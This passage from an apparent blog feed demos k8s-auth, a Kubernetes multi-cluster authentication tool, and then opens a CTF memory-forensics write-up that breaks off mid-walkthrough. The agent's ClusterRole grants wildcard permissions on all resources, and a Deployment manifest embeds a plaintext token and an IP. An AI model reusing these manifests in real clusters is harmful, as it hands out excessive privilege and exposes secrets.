danger\">\n<p>Please note that this project is open source and the code is available to anyone interested. It is currently an MVP version that functions effectively, and we plan to add more features in the future.</p>\n</div>\n<div class=\"note warning\">\n<p>Don’t forget that this project is open to contributions from the community! If you find a bug or have a feature request, feel free to open an issue on the project’s GitHub page. And if you’re interested in helping out with the development, pull requests are always welcome! Let’s work together to make this project even better.</p>\n</div>\n<div class=\"links\"><div class=\"item\" title=\"k8s-auth-server\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLXNlcnZlcg==\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLXNlcnZlcg==\">k8s-auth-server</span>\n          <p class=\"desc\">The authentication server</p>\n          </div></div><div class=\"item\" title=\"k8s-auth-kube\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWt1YmU=\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWt1YmU=\">k8s-auth-kube</span>\n          <p class=\"desc\">The Controller/Agent for k8s-auth</p>\n          </div></div><div class=\"item\" title=\"k8s-auth-cli\" style=\"--block-color:#02bf1b;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWNsaQ==\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWNsaQ==\">k8s-auth-cli</span>\n          <p class=\"desc\">The CLI utility for k8s-auth</p>\n          </div></div></div>\n<h1 id=\"the-demo\"><a class=\"markdownIt-Anchor\" href=\"#the-demo\">#</a> The DEMO !</h1>\n<p>And the icing on the cake? I am going to show you how to set up and use k8s-auth in a demo that will blow your mind (in a good way, of course). So grab your popcorn and let’s get this Kubernetes party started!</p>\n<p>Ladies and Gentlemen, it’s showtime! Let’s get ready to k8s-authenticate! We’ll be putting the spotlight on three stars of this demo: The Authentication Server, The Agent/Controller, and the Command Line Utility! These babies were born to shine in the Go language (talk about power!) and are all open-source, so you can check them out on my GitHub page. And, to make things even easier, we’ve containerized the authentication server and agent, so you can just pull them like a cold one on a hot summer day. Check out my Docker Hub profile for more juicy details!</p>\n<h2 id=\"setting-up-authentication-server\"><a class=\"markdownIt-Anchor\" href=\"#setting-up-authentication-server\">#</a> Setting up Authentication Server</h2>\n<p>Hold your horses, folks! The authentication server may be containerized, but it’s not going inside Kubernetes! Don’t forget to set up those environment variables for the server - especially the admin email! (He deserve a name and a full name too, don’t they?) And guess what, the admin can log in with Google OAuth2! Just make sure to give the Client ID, Client Secret, and Redirection Link, or else things won’t work too smoothly.</p>\n<blockquote>\n<p>You need to create an OAuth 2.0 Client with the Google API in google cloud platform!</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/YqhD79J.png\" alt=\"\"></p>\n<ul>\n<li><code>K8S_AUTH_ADMIN_NAME</code> : The administrator name! (My name is default value)</li>\n<li><code>K8S_AUTH_ADMIN_FULLNAME</code> : The administrator name! (My name is default value)</li>\n<li><code>K8S_AUTH_ADMIN_MAIL</code> : The administrator name! (My email is default value)</li>\n<li><code>OAUTH2_CLIENT_ID</code> : The google Oauth2 Client ID (Required)</li>\n<li><code>OAUTH2_CLIENT_SECRET</code> : The google Oauth2 Secret  (Required)</li>\n<li><code>OAUTH2_REDIRECT_URL</code> : The google Oauth2 Redirect URL callback (Required, it must be redirected to /callback endpoint of your server )</li>\n</ul>\n<blockquote>\n<p>Let’s assume that the server is deployed on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hdXRoLjRuNm5rOHMudGVjaA==\">https://auth.4n6nk8s.tech</span>,<br>\n <code>OAUTH2_REDIRECT_URL</code>  must be <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hdXRoLjRuNm5rOHMudGVjaC9jYWxsYmFjaw==\">https://auth.4n6nk8s.tech/callback</span></p>\n</blockquote>\n<p>It’s docker time!  <code>mohamedrafraf/k8s-auth-server</code>  is the docker image that you need! Let’s run this server!</p>\n<figure class=\"highlight bash\"><figcaption><span>run server</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name server -it -p 80:8080 -e OAUTH2_CLIENT_ID=xxxx -e OAUTH2_CLIENT_SECRET=xxx ... mohamedrafraf/k8s-auth-server</span><br></pre></td></tr></table></figure>\n<p>Make sure to input all the necessary variables for the server to run smoothly. And once you’ve done that, sit back and relax, and let the server do its thing! Keep your hands off those logs, let them flow in peace!</p>\n<h2 id=\"interacting-with-server-using-k8s-auth-cli\"><a class=\"markdownIt-Anchor\" href=\"#interacting-with-server-using-k8s-auth-cli\">#</a> Interacting with server using k8s-auth CLI</h2>\n<p>It’s CLI installation time, folks! This nifty command line utility is your ticket to the k8s-auth party. With the CLI, you can log in as an admin or regular user and interact with the server based on your permission level.</p>\n<p>But wait, there’s more! For the first time, only the admin with their fancy schmancy email address can access the server. They’ll be the ones registering the cluster, setting up the agent, and creating a connection between the server and the agent. Then, it’s time to have some fun with users, groups, and permissions. Who said authentication couldn’t be funny?</p>\n<p>You can build the command line utility or download it by running:</p>\n<figure class=\"highlight bash\"><figcaption><span>download cli</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/Mohamed-Rafraf/k8s-auth-cli/releases/download/test/k8s-auth</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> +x k8s-auth &amp;&amp; sudo <span class=\"built_in\">mv</span> k8s-auth /usr/bin</span><br></pre></td></tr></table></figure>\n<p>Now, you can use this command line utility just like any other tool in your system!</p>\n<p><img data-src=\"https://imgur.com/EciPajC.png\" alt=\"\"></p>\n<p>Before start playing with this command line you need to know that on each command you need to specify the authentication server that you want to interact with! So either you user  <code>--server</code>  on each command or use  <code>K8S_AUTH_SERVER</code>  environment variable to make it more easy for you! I’ll go with the 2nd option!</p>\n<figure class=\"highlight bash\"><figcaption><span>export env var</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> K8S_AUTH_SEVER=https://auth.4n6nk8s.tech</span><br></pre></td></tr></table></figure>\n<p>Now you need to log in as an adminstrator! It’s not that hard just run  <code>k8s-auth login</code>  and forget to specify  <code>--admin</code>  to login as the super user!</p>\n<p><img data-src=\"https://imgur.com/10prjzn.png\" alt=\"\"></p>\n<p>The utility needs a secret token, which you’ll get from an URL link. This link will take you to Google for authentication and authorization as an admin. Once you’re authorized, you’ll get the secret token to paste and everything will be good to go.</p>\n<p>You’ll get something like this one in case you’re authorized!<br>\n<img data-src=\"https://imgur.com/Yt9FZgD.png\" alt=\"\"></p>\n<p>Copy that thing don’t worry! Once you paste it, the utility will verify the token and let you know if you’re ready for your actions or not!</p>\n<p><img data-src=\"https://imgur.com/MY7TTOZ.png\" alt=\"\"></p>\n<p>Bingo we are ready for action! Now as an admin you can register clusters, create,delete,modify users and groups (and their permissions) inside each cluster!</p>\n<blockquote>\n<p>Let’s assume that you have 2 clusters! You create a user inside cluster1 and you give him permission to list pods on dev namespace. You can add that user to cluster2 with other permission like create secrets on prod namespace</p>\n</blockquote>\n<p>It’s time to register a cluster! You’ll recieve a secret token.</p>\n<p><img data-src=\"https://imgur.com/yvANfkB.png\" alt=\"\"></p>\n<p>And as you see here! The cluster is registered using  <code>k8s-auth create cluster</code>  and you can list registred clusters with  <code>k8s-auth get clusters</code></p>\n<blockquote>\n<p>Keep in mind that registerd cluster have 2 status, not Active when the cluster is not verified yet. The Active status will show you the API SERVER address/hostname</p>\n</blockquote>\n<blockquote>\n<p>Only Admins can see the tokens! Running the same command as a regular user will list you only the clusters that you have access to it (so not all cluster) and without the token!</p>\n</blockquote>\n<p>Let’s take rest now from the CLI. It’s time for kubernetes! Let’s deploy the agent/controller that will communicate with the server!</p>\n<h2 id=\"deploy-the-agentcontroller-inside-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#deploy-the-agentcontroller-inside-kubernetes\">#</a> Deploy the Agent/Controller inside Kubernetes</h2>\n<p>Deploying the agent is not rocket science! Deploying the agent is not rocket science! (To be honest i didn’t make a helm chart yet, Sadly 😦 ). But if you want to do it the old fashioned way, no worries! It’s still a piece of cake. Just keep in mind that you need to create a namespace called “k8s-auth” in your cluster. This namespace will contain all the service accounts and secrets of the users that authenticate and have a session with the cluster.</p>\n<p>The agent’s mission is to make sure everyone gets what they need! It creates service accounts, roles, and role bindings to make sure users have the right permissions in the cluster. That’s why the agent itself needs a service account and permissions to do its job inside the cluster.</p>\n<p>Let’s create the namespace and the service account for this agent!</p>\n<figure class=\"highlight yaml\"><figcaption><span>create ns & sa</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Namespace</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span> &#123;&#125;</span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ServiceAccount</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br></pre></td></tr></table></figure>\n<p>This service account need a clusterrole that allow to create roles to anything!  to grant permission for creating pods you must have this permission first! You can’t give permission of create something and you can’t do it!!!</p>\n<p>Next, the service account will need an appropriate permissions to carry out its mission inside the cluster. Specifically, it requires a clusterrole that grants permission to create roles for any resource.</p>\n<p>In kubernetes world, granting permission to create something requires that you have the permission yourself!. For example, you can’t grant permission to create pods if you don’t have permission to create pods even you have permission to create roles!!</p>\n<p>Let’s create the clusterole and the binding!</p>\n<figure class=\"highlight yaml\"><figcaption><span>create cluster role</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ClusterRole</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ClusterRoleBinding</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">roleRef:</span></span><br><span class=\"line\">  <span class=\"attr\">apiGroup:</span> <span class=\"string\">rbac.authorization.k8s.io</span></span><br><span class=\"line\">  <span class=\"attr\">kind:</span> <span class=\"string\">ClusterRole</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">subjects:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">kind:</span> <span class=\"string\">ServiceAccount</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br></pre></td></tr></table></figure>\n<p>Now it’s time to the last part! we will deploy the agent itself! The agent need to know some information so as expected there is some environement variable!</p>\n<ul>\n<li><code>CLUSTER_NAME</code> : is the same name that you put it inside the authentication server</li>\n<li><code>TOKEN</code> : The generated token from the authentication server</li>\n<li><code>SERVER</code> : The authentication server itself</li>\n<li><code>API_SERVER</code> : This is contains the public hostname for the API SERVER. The agent can detect it correctly when you have a cluster inside Network and the cluster is not exposed in the internet</li>\n</ul>\n<blockquote>\n<p>I used kubeadm clusters in provisionning clusters. I didn’t find a way to find the public hostname! So you need to indicate the api server until it will be fixed!</p>\n</blockquote>\n<figure class=\"highlight yaml\"><figcaption><span>deploy</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">strategy:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">serviceAccountName:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-auth-kube</span> </span><br><span class=\"line\">        <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth-kube</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">CLUSTER_NAME</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">ctf-cluster</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">TOKEN</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">&quot;Z8taw1yFw4lsq7cgSvmZ&quot;</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">SERVER</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">&quot;https://auth.4n6nk8s.tech&quot;</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">API_SERVER</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">https://172.190.91.84:6443</span></span><br><span class=\"line\">        <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>After deploying the agent. you can check the clusters with the cli again and you’ll find everything is ok!<br>\n<img data-src=\"https://imgur.com/MqHeeY1.png\" alt=\"\"></p>\n<p>The cluster is on Active status and the api server is not empty now! You can repeat this operation with many clusters and this is how multi-clusters can work together!</p>\n<h2 id=\"create-users-and-groups\"><a class=\"markdownIt-Anchor\" href=\"#create-users-and-groups\">#</a> Create Users and Groups</h2>\n<p>The cluster is now ready for authentication and has been verified to be functioning without any issues. The connection between the cluster and authentication has been established. Now, let’s proceed to creating groups and users.</p>\n<p>Let’s see what  <code>k8s-auth create</code>  can do for us!</p>\n<p><img data-src=\"2023-04-29-15-56-38.png\" alt=\"\"></p>\n<p>Great news! With the  <code>k8s-auth create</code>  command, you can easily create groups and users for your authenticated clusters. To create a group, simply specify the cluster and provide a YAML manifest file containing the roles for that group. For creating a user, you can either assign them to an existing group or provide a YAML manifest file for the user’s roles if they do not belong to any group.</p>\n<p>Let’s define the role for our group that we will create!</p>\n<figure class=\"highlight yaml\"><figcaption><span>group rule</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Role</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">dev</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pod-and-secret</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;pods&quot;</span>,<span class=\"string\">&quot;secrets&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;list&quot;</span>,<span class=\"string\">&quot;create&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Role</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">prod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pod-list</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;pods&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure>\n<p>The group we’re about to create will be granted permission to create and list pods and secrets in the “dev” namespace, while they will only be able to list pods in the “prod” namespace.</p>\n<blockquote>\n<p>Any user will be belong to this group will have these permissions! You don’t have to repeat the same manifest for each user!. This is why groups exists!</p>\n</blockquote>\n<p>This command will create the group for you</p>\n<figure class=\"highlight bash\"><figcaption><span>command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth create group &lt;name&gt; --cluster=&lt;cluster&gt; --file=&lt;rbac_file&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://imgur.com/g5YBB8u.png\" alt=\"\"></p>\n<p>As you can see here! The group is create successfully and you can see his permission when you forget it using  <code>k8s-auth get permission</code>  command!</p>\n<p>You can discover what you can do with  <code>k8s-auth get</code>  command!! You can a list users too!</p>\n<p><img data-src=\"https://imgur.com/MOC7L1o.png\" alt=\"\"></p>\n<p>Now let’s create a user that belong to this group! So we don’t need to specify any manifest file that define roles!</p>\n<figure class=\"highlight bash\"><figcaption><span>user</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth create user --name &lt;name&gt; --fullname &lt;value&gt; --mail &lt;mail&gt; --cluster &lt;cluster&gt; --group &lt;group&gt;</span><br></pre></td></tr></table></figure>\n<p>In case that you want to create a user that don’t belongs to any group and have his own permission you can delete the  <code>--group</code>  and change it with  <code>--file</code>  and specify the yaml file that contains his roles!</p>\n<blockquote>\n<p>No need to worry about naming roles because there won’t be any overlapping between them. The agent takes care of creating roles and bindings in the background, and the names you specify in the manifest won’t be used directly.</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/n2S8BQM.png\" alt=\"\"></p>\n<p>You can update the permission using the  <code>k8s-auth update permisssion</code>  command! This command can update groups and users permission</p>\n<p>In case you change the permission for a user that belgons to a group. This user will leave that group because he will have his own permissions (different from the group one)</p>\n<blockquote>\n<p>You can’t delete a group if is not empty!</p>\n</blockquote>\n<blockquote>\n<p>When User have an opened session with a cluster and use kubectl normally and you decide to delete that user the session will be closed and he can’t do anything!</p>\n</blockquote>\n<h2 id=\"authenticate-to-a-cluster\"><a class=\"markdownIt-Anchor\" href=\"#authenticate-to-a-cluster\">#</a> Authenticate to a cluster</h2>\n<p>As a regular user you need to login to the authentication server using  <code>k8s-auth login</code>  and you’ll receive a link as the admin login process!</p>\n<p>Then you can list the clusters that you can authenticate with using  <code>k8s-auth get clusters</code>  and keep in your mind that you’ll never see the token of each cluster (Only admins can see tokens)</p>\n<p>Once you decided which cluster you’ll authenticate! run the command  <code>k8s-auth auth</code>  with specifying the cluster name!</p>\n<figure class=\"highlight bash\"><figcaption><span>authenticate</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth auth cluster=ctf-cluster</span><br><span class=\"line\"></span><br><span class=\"line\">To use this cluster run this <span class=\"built_in\">command</span>: <span class=\"built_in\">export</span> KUBECONFIG=<span class=\"variable\">$HOME</span>/.k8s-auth.config</span><br></pre></td></tr></table></figure>\n<p>If you’re authorized, you’ll receive a message like that! What is happening?</p>\n<p>Actually the k8s-auth CLI generate a kubeconfig file for you! run the command that the CLI suggest to you! BOOOM Start Kubectlying !!! xD</p>\n<h2 id=\"conclusion\"><a class=\"markdownIt-Anchor\" href=\"#conclusion\">#</a> Conclusion</h2>\n<p>As highlighted in the blog post, the process of authentication has been simplified with just 3 simple commands - login, auth, and export KUBECONFIG. These commands enable users to easily open a session with any cluster they want, regardless of the number of clusters and different permissions required, using just a single set of credentials. Additionally, the administrator can easily set up agents in the clusters, and manage the permissions and the entire process centrally using a smooth command line interface.</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/03/23/Writeups/ncsc2023/",
            "url": "http://example.com/2023/03/23/Writeups/ncsc2023/",
            "title": "NCSC'2023 Writeup Challenges",
            "date_published": "2023-03-23T10:33:37.000Z",
            "content_html": "<p>The National Cyber Security Congress (NCSC) is a three-day event that brings together cyber security enthusiasts and experts. The event features a wide range of activities, including workshops, talks, conferences, and two exciting CTF competitions.</p>\n<p><img data-src=\"https://imgur.com/LJslRYb.png\" alt=\"\"></p>\n<p>As a technical team member, I had the chance to create challenges in Kubernetes, Digital Forensics, Misc, Hardware, and Game Hacking categories.</p>\n<p>The NCSC CTF provided a unique opportunity for cyber security enthusiasts to demonstrate their problem-solving abilities, teamwork, and technical proficiency in a fun and competitive environment. Overall, the event was an exciting and rewarding experience for all involved.</p>\n<p>In this blog, I will share some write-ups that players have requested!</p>\n<h1 id=\"digital-forensics-mokni-seals\"><a class=\"markdownIt-Anchor\" href=\"#digital-forensics-mokni-seals\">#</a> Digital Forensics : Mokni &amp; Seals</h1>\n<p><img data-src=\"https://i.imgur.com/i231apB.png\" alt=\"\"></p>\n<p>We got a zip file! I bet that file is a memory dump! So i tried to run the volatility imageinfo plugin but it takes a long time. So I tried to figure out if this file is Linux memory dump or not!</p>\n<figure class=\"highlight bash\"><figcaption><span>linux or win ?</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s: strings data.raw | grep <span class=\"string\">&quot;Linux version&quot;</span> </span><br><span class=\"line\">Linux version 5.8.0-43-generic (buildd@lcy01-amd64-018) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils <span class=\"keyword\">for</span> Ubuntu) 2.34) 49~20.04.1-Ubuntu SMP Fri Feb 5 09:57:56 UTC 2021 (Ubuntu 5.8.0-43.49~20.04.1-generic 5.8.18)</span><br></pre></td></tr></table></figure>\n<p>And yes it’s a Linux Memory dump! I guess its time to start finding/making a profile but let me check that is memory dump can be analyzed with a profile or not!</p>\n<figure class=\"highlight bash\"><figcaption><span>checking</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -i insmod       </span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko path=../../Linux64.mem format=raw</span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko <span class=\"string\">&quot;path=../../Linux64.mem format=raw&quot;</span></span><br><span class=\"line\">sudo insmod ./lime-5.8.0-43-generic.ko <span class=\"string\">&quot;path=../../Linux64.mem format=raw&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Oh! The format is ram! which means that even if we get the correct profile volatility can’t analyze this memory dump! Strings time! The author want us to solve this mem dump using strings !</p>\n<p>Let’s try to figure out some command lines! Bash history! Let me show you this trick!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract bash history</span></figcaption><table><tr><td class=\"gutter\"><pre><span 